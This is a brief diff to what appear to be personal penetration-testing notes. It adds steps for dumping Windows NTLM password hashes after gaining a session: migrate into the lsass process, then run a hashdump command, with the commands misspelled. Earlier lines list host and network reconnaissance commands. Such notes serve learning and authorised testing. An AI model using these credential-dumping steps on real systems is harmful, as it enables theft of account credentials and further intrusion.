@@ -5,3 +5,8 @@ ls C:/Usuarios
 ls C:/Users
 run arp_scanner -i
 ifconfig
+
+# Get NTLM Hash
+- Migrate to lsass process
+	> migrete -P [procesID]
+- Use hasdump
